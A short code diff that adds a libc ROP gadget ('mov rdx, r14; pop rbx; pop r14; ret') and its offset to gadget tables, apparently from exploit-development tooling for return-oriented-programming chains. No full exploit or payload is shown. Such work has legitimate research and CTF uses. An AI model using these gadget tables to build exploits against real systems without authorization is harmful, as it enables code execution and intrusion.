@@ -62,6 +62,7 @@ GADGET_OFFSETS = {
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x3EB7E,
             "mov rax, [rax]; ret": 0x700D7,
             "mov r9, r14; call r15": 0x3a387,
+            "mov rdx, r14; pop rbx; pop r14; ret": 0xc8bee,
         },
     },
 }
@@ -70,6 +71,7 @@ LIBC_GADGETS = [
     "mov rsp, [rdi + 0x38]; pop rdi; ret",
     "mov rax, [rax]; ret",
     "mov r9, r14; call r15",
+    "mov rdx, r14; pop rbx; pop r14; ret",
 ]
 
 LIBC_OFFSETS = {
